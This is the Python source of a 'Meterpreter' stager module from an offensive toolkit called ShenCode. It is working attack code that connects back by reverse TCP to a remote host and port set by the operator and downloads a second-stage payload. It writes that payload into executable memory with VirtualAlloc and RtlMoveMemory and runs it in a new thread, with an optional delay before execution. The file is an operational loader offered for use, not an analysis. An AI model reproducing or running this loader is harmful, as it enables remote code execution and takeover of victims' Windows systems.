########################################################
### ShenCode Module
###
### Name: Meterpreter
### Docs: https://heckhausen.it/shencode/README
### 
########################################################

from utils.style import *
from os import name as osname
if osname == 'nt':
    from utils.windef import *
    from utils.winconst import *
from time import sleep
import socket
import struct

CATEGORY    = 'stager'
DESCRIPTION = 'Connect back (reverse_tcp) to remote host and receive a stage'

cs = ConsoleStyles()

arglist = {
    'remote_host':         { 'value': None, 'desc': 'Remote host to connect to' },
    'remote_port':         { 'value': 4444, 'desc': 'Remote port to connect to' },
    'timeout':             { 'value': 30, 'desc': 'Connect timeout in seconds, 30 seconds is the default' },
    'architecture':        { 'value': 'x64', 'desc': 'Architecture to use, x64 is the default (x86/x64)' },
    'sleeptime':           { 'value': 0, 'desc': 'Sleep for x seconds before the stage is executed' }
}

def register_arguments(parser):
    parser.add_argument('-p', '--remote-port', default=4444, type=int, required=True, help=arglist['remote_port']['desc'])
    parser.add_argument('-r', '--remote-host', type=str, required=True, help=arglist['remote_host']['desc'])

    grp = parser.add_argument_group('additional')
    grp.add_argument('-a', '--architecture', choices=['x64', 'x86'], default='x64', type=str, help=arglist['architecture']['desc'])
    grp.add_argument('-s', '--sleeptime', default=0, type=int, required=True, help=arglist['sleeptime']['desc'])
    grp.add_argument('-t', '--timeout', default=30, type=int, help=arglist['timeout']['desc'])

class module:
    
    Author          = 'raptor@0xdeadbeef.info, psycore8'
    Version         = '0.9.0'
    DisplayName      = 'METERPRETER-STAGER'
    payload         = any
    payload_size    = int
    sock            = any
    relay_output    = False
    shell_path      = '::stager::meterpreter'

    def __init__(self, remote_host=str, remote_port=int, timeout=int, architecture=str, sleeptime=int):
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.timeout = timeout
        self.architecture = architecture
        self.sleeptime = sleeptime

    def CreateSocket(self):
        cs.console_print.note('Creating Socket...')
        socket.setdefaulttimeout(self.timeout)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        con = self.sock.connect_ex((self.remote_host, int(self.remote_port)))
        if con == 0:
            cs.console_print.ok('Connection established')
        else:
            cs.console_print.error('Connection failed')
            return

    def ReceivePayload(self):
        # get 4-byte payload length
        l = struct.unpack("@I", self.sock.recv(4))[0]

        # download payload
        cs.console_print.note('Download stage...')
        d = self.sock.recv(l)
        while len(d) < l:
            d += self.sock.recv(l - len(d))
        self.payload_size = len(d)
        cs.console_print.note(f'Payload size: {self.payload_size} bytes')

        if self.architecture == 'x64':
            self.payload = bytearray(
                b"\x48\xbf"
                + self.sock.fileno().to_bytes(8, byteorder="little")
                + d)
        elif self.architecture == 'x86':
            self.payload = bytearray(
                    b"\xbf"
                    + self.sock.fileno().to_bytes(4, byteorder="little")
                    + d)
        if self.payload:
            cs.console_print.ok('Stage downloaded!')
            #self.msg('proc.stage_ok')
        else:
            cs.console_print.error('Error during download')
            return
            
    def LaunchStage(self):
        cs.console_print.note('Trying to execute Meterpreter stage...')
        ptr = VirtualAlloc(0, len(self.payload), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
        if ptr:
            cs.console_print.ok('Memory allocated!')
            RtlMoveMemory(ptr, bytes(self.payload), len(self.payload))

        if self.sleeptime > 0:
            cs.console_print.info(f'Let\'s take a nap for {self.sleeptime} seconds')
            sleep(self.sleeptime)
        
        cs.console_print.note('Execute payload...')
        ht = CreateThread(None, 0, ptr, None, 0, None)
        if ht:
            cs.console_print.ok('Thread created. Looks good!')
        else:
            cs.console_print.error('Payload not executed')
            return
        WaitForSingleObject(ht, -1)    

    def process(self):
        cs.module_header(self.DisplayName, self.Version)
        self.CreateSocket()
        self.ReceivePayload()
        if self.relay_output:
            print('\n')
            return self.payload
        else:
            self.LaunchStage()

    